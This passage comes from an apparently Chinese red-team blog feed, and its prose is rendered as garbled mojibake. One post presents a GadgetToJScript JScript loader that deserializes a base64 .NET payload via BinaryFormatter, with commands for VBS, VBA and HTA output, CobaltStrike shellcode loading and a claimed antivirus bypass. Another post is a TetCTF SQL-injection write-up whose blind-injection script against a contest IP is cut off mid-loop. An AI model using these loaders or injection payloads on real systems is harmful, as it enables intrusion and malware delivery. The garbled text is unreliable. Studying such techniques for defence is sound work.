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"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shell = <span class="keyword">new</span> ActiveXObject(<span class="string">'WScript.Shell'</span>);</span><br><span class="line">ver = <span class="string">'v4.0.30319'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">shell.RegRead(<span class="string">'HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\'</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123; </span><br><span class="line">ver = <span class="string">'v2.0.50727'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shell.Environment(<span class="string">'Process'</span>)(<span class="string">'COMPLUS_Version'</span>) = ver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ms_1 = Base64ToStream(stage_1, <span class="number">2341</span>);</span><br><span class="line"><span class="keyword">var</span> fmt_1 = <span class="keyword">new</span> ActiveXObject(<span class="string">'System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'</span>);</span><br><span class="line">fmt_1.Deserialize_2(ms_1);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="keyword">var</span> ms_2 = Base64ToStream(stage_2, <span class="number">9073</span>);</span><br><span class="line"><span class="keyword">var</span> fmt_2 = <span class="keyword">new</span> ActiveXObject(<span class="string">'System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'</span>);</span><br><span class="line">fmt_2.Deserialize_2(ms_2);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">catch</span> (e2)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥å‘ç°ä»–åŒæ ·æ˜¯è°ƒç”¨äº†<code>System.Runtime.Serialization</code>ï¼Œé€šè¿‡å¯¹ä¸¤ä¸ªvarçš„ååºåˆ—åŒ–æ“ä½œï¼Œä»è€Œæ‰§è¡Œ</p><h4 id="ToVBS-1"><a href="#ToVBS-1" class="headerlink" title="ToVBS"></a>ToVBS</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GadgetToJScript.exe -w vbs -e b64 -o test</span><br></pre></td></tr></table></figure><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/BE486433-85F9-448D-BEBD-EBFA9A50436B.png" alt="a1155707ec2d37a33a56419d88f7d42c"></p><h4 id="ToVBA-1"><a href="#ToVBA-1" class="headerlink" title="ToVBA"></a>ToVBA</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GadgetToJScript.exe -w vba -e b64 -o test</span><br></pre></td></tr></table></figure><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/69BE87FE-3C56-4E0B-9810-56D228DE9416.png" alt="b743bbeda5efe5d671d80d37b608f8ae"></p><h4 id="ToHta"><a href="#ToHta" class="headerlink" title="ToHta"></a>ToHta</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GadgetToJScript.exe -w hta -e b64 -o test</span><br></pre></td></tr></table></figure><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/F4D5151C-9BB1-431F-8433-45EC5FA4B541.png" alt="3d4f965a8df23a1587cb482314bbe890"></p><h4 id="With-CobaltStrike-Covenant"><a href="#With-CobaltStrike-Covenant" class="headerlink" title="With CobaltStrike/Covenant"></a>With CobaltStrike/Covenant</h4><p>åˆ©ç”¨csäº§ç”Ÿçš„shellcodeè¿›è¡ŒåŠ è½½<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/5693697E-4B11-4863-9EC1-B9BA33C9C584.png" alt="ad6e9841f325ef8cfe1017e805955d0b"></p><p>å½“ç„¶ï¼Œéœ€è¦ä¿®æ”¹ä¸€ä¸‹ç¨‹åºè·å–csä»£ç çš„åœ°æ–¹<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/691764A8-EAAB-4B38-A1A0-1BEB55D3D4F4.png" alt="3a0df07cf0611417e3d2e7992c01fffa"></p><p>è¿™ä¹Ÿæ˜¯ä¸‰å¥½å­¦ç”Ÿå¸ˆå‚…çš„æ–¹æ³•ï¼ŒåŒæ ·çš„ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ªå‚æ•°è¿›è¡Œè¾“å…¥ã€‚</p><p>Covenantæä¾›äº†Binaryçš„æºä»£ç ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åŠ è½½<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/C0170DB0-C8E9-4BF2-9DFA-2B120B6FD4B3.png" alt="2b76ba5f5c1668f3746da3fd7bf9a777"></p><h3 id="Analyse-1"><a href="#Analyse-1" class="headerlink" title="Analyse"></a>Analyse</h3><p>é¦–å…ˆï¼Œ<code>GadgetToJScript</code>ç›¸æ¯”äº<code>DotNetToJScript</code>æ¥è¯´ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¸éœ€è¦è°ƒç”¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DynamicInvoke(al.ToArray()).CreateInstance(CLASS)</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥è§„é¿ä¸€äº›æ€è½¯çš„æ£€æµ‹ã€‚å†è€…ï¼Œæ›´é€‚åˆè¿›è¡ŒäºŒæ¬¡å¼€å‘ï¼Œè¿™ç‚¹ä¹‹å‰<code>RedCore@Moriarty</code>å¸ˆå‚…å·²ç»æ¼”ç¤ºè¿‡é’ˆå¯¹GadgetToJScriptçš„äºŒæ¬¡å¼€å‘ï¼Œä»¥åŠæ·±åº¦ä½¿ç”¨äº†ã€‚</p><p>å’Œä¹‹å‰ä¸€æ ·ï¼ŒGadgetToJScriptä¹Ÿæ˜¯é€šè¿‡æ¨¡ç‰ˆè¿›è¡Œè½¬æ¢<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/28D65DAE-70F0-4D05-BF03-158507C27264.png" alt="ead4d3d00d81660fa06730d31b6f1cab"></p><p>æä¾›äº†4ç§è„šæœ¬ç±»å‹å’Œ2ç§ç¼–ç <br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/945108D9-6949-4D05-BD09-61967B79FC42.png" alt="7e1173be4991970ea94100facd3a6e76"></p><p>æ ¹æ®<code>_wsh</code>é€‰å–å¯¹åº”æ¨¡ç‰ˆ<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/7E7B6643-A665-4707-AFDA-D346015D179F.png" alt="2b3316a440cd16aed3f3d6a2c8c6c501"></p><p>åé¢å°±æ˜¯é’ˆå¯¹å…·ä½“ç±»å‹çš„ä¸€äº›æ›¿æ¢å˜é‡<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/7E2C3CDF-7C60-45CD-A70E-7A2832AED6D1.png" alt="13a71f77aa239c5765a1f25e96179362"></p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/902E2F50-75B6-46D7-9EDF-0205DA84D9BF.png" alt="566b609db0474315721205518e7e4e93"></p><p>å®ç°çš„é€»è¾‘ï¼š</p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/605EE971-D504-4731-B4BA-C4B8BDF63713.png" alt="eb724db565d3c8255c3d8b9ade179acd"><br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/E1B60502-6989-4F0A-A338-404B8A8E71FD.png" alt="ca72a4112bd087f4b4c3727c6b5c37d7"></p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/4ACCE8DB-7A46-4B23-9F58-F172EC493CC0.png" alt="92445e4789f52d1fd55064d67a20423c"></p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/A1092ACD-30F9-4844-9E4A-A56F118039C0.png" alt="4a811eba7e0f586e9c45951578db8053"></p><p>å†åæ¥å°±æ˜¯ç›´æ¥æ›¿æ¢æ•°æ®ï¼Œç”Ÿæˆç›®æ ‡æ–‡ä»¶</p><h2 id="0x03-LinksğŸ”—"><a href="#0x03-LinksğŸ”—" class="headerlink" title="0x03 LinksğŸ”—"></a>0x03 LinksğŸ”—</h2><p><a href="https://github.com/tyranid/DotNetToJScript" target="_blank" rel="noopener">https://github.com/tyranid/DotNetToJScript</a><br><a href="https://github.com/Cn33liz/StarFighters" target="_blank" rel="noopener">https://github.com/Cn33liz/StarFighters</a><br><a href="https://github.com/med0x2e/GadgetToJScript" target="_blank" rel="noopener">https://github.com/med0x2e/GadgetToJScript</a><br><a href="https://3xpl01tc0d3r.blogspot.com/2020/02/gadgettojscript-covenant-donut.html" target="_blank" rel="noopener">https://3xpl01tc0d3r.blogspot.com/2020/02/gadgettojscript-covenant-donut.html</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F/</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/GadgetToJScript%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/GadgetToJScript%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2020-03-10 17:48:22&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;/wallpaper/girl_umbrella_rain.jpg&quot; alt&gt;&lt;/p&gt;
&lt;
      
    
    </summary>
    
      <category term="Red-Team Tricks" scheme="http://patrilic.top/categories/Red-Team-Tricks/"/>
    
    
      <category term="DotNet" scheme="http://patrilic.top/tags/DotNet/"/>
    
  </entry>
  
  <entry>
    <title>TetCTF - Secure System Write-up</title>
    <link href="http://patrilic.top/2020/01/09/TetCTF%20-%20Secure%20System%20Write-up/"/>
    <id>http://patrilic.top/2020/01/09/TetCTF - Secure System Write-up/</id>
    <published>2020-01-09T06:49:00.000Z</published>
    <updated>2020-03-18T09:46:39.603Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2020-01-09 14:49:00<br><img src="/wallpaper/vocaloid.jpg" alt></p></blockquote><h2 id="0x00-é¢˜ç›®æè¿°"><a href="#0x00-é¢˜ç›®æè¿°" class="headerlink" title="0x00 é¢˜ç›®æè¿°"></a>0x00 é¢˜ç›®æè¿°</h2><p>é¢˜ç›®é“¾æ¥ï¼š <a href="http://45.77.240.178:8002/" target="_blank" rel="noopener">http://45.77.240.178:8002/</a></p><p><img src="/TetCTF - Secure System Write-up.resources/B29EA8C6-2D14-41CF-99C1-FF9B0EDFB058.png" alt="ea89ccbacf44ccaeee8376d3d5bfb923"></p><h2 id="0x01-Write-up"><a href="#0x01-Write-up" class="headerlink" title="0x01 Write-up"></a>0x01 Write-up</h2><p>é¢˜ç›®ç»™å‡ºçš„æºç åªæœ‰ä¸€ä¸ªindex.phpæ–‡ä»¶<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'dbconnect.php'</span>);</span><br><span class="line">$flag = mysqli_query($conn,<span class="string">"SELECT * FROM xxxxxxxxxxxxxxxxxxx"</span>)-&gt;fetch_assoc()[<span class="string">'yyyyyyyyyyyyyyyyyyyy'</span>]; <span class="comment">//Sorry It's our secret, can't share</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;center&gt;</span><br><span class="line">Security Check!!! Please enter your ID to prove who are you !!!:</span><br><span class="line">&lt;form action=<span class="string">"index.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;input name=<span class="string">"id"</span> value=<span class="string">""</span> /&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/and|or|in|if|case|sleep|benchmark/is'</span> , $_POST[<span class="string">'id'</span>])) </span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'Tet nhat ai lai hack nhau :(, very dangerous key word'</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> (preg_match(<span class="string">'/order.+?by|union.+?select/is'</span> , $_POST[<span class="string">'id'</span>])) </span><br><span class="line">        &#123; </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'Tet nhat ai lai hack nhau :(, very dangerous statement'</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                $user = mysqli_query($conn,<span class="string">"SELECT * FROM users WHERE id="</span>.$_POST[<span class="string">'id'</span>])-&gt;fetch_assoc()[<span class="string">'username'</span>]; </span><br><span class="line">                <span class="keyword">if</span>($user!==<span class="string">'admin'</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'Hello '</span>.htmlentities($user);</span><br><span class="line">                        <span class="keyword">if</span>($user===<span class="string">'admin'</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">'This can\'t be =]] Just put here for fun lul'</span>;</span><br><span class="line">                                <span class="keyword">die</span>($flag);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>ä¸€çœ‹æºç å°±çŸ¥é“æ˜¯é“çº¯ç²¹çš„SQLæ³¨å…¥é¢˜ç›®, è€Œä¸”è·å¾—flagçš„å½¢å¼åº”è¯¥æ˜¯ç›´æ¥ä»æ•°æ®åº“ä¸­æ³¨å‡ºæ¥</p><p>å› ä¸ºè¿‡æ»¤äº†sleepä»¥åŠbenchmarkï¼Œæ‰€ä»¥åº”è¯¥æ˜¯å¸ƒå°”ç›²æ³¨<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> &amp;&amp; <span class="keyword">ord</span>(<span class="keyword">substr</span>(<span class="keyword">DATABASE</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">104</span>;</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯ordçš„orè¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨<code>convv(hex())</code>æˆ–è€…<code>ascii</code><br><img src="/TetCTF - Secure System Write-up.resources/96B675BE-34F7-4F19-B189-3981EFF17340.png" alt="c91fcfd31936474702b02abb961fbca8"></p><p>å…ˆè·å–<code>database()</code>è¯•è¯•<br><img src="/TetCTF - Secure System Write-up.resources/4ED56111-7CBB-42C9-95B5-5243D32628AA.png" alt="f2f429a807a9fb530ec8f2fad4141522"></p><p>åˆ¤æ–­å‡ºdatabaseé•¿åº¦ä¸º10<br><img src="/TetCTF - Secure System Write-up.resources/24D8112D-2B2F-4583-9DE2-F57F5DA54EE7.png" alt="7782176063dc8cf8b343b49fb35cafd2"></p><p>å†™ä¸ªå°è„šæœ¬è·‘ä¸€ä¸‹æ•°æ®åº“å<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2020-01-09 11:31</span></span><br><span class="line"><span class="comment"># @Author  : Patrilic</span></span><br><span class="line"><span class="comment"># @FileName: sql_dbs.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://45.77.240.178:8002/index.php"</span></span><br><span class="line">proxy = &#123;<span class="string">"http"</span>:<span class="string">"127.0.0.1:8000"</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database_name = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">128</span>):</span><br><span 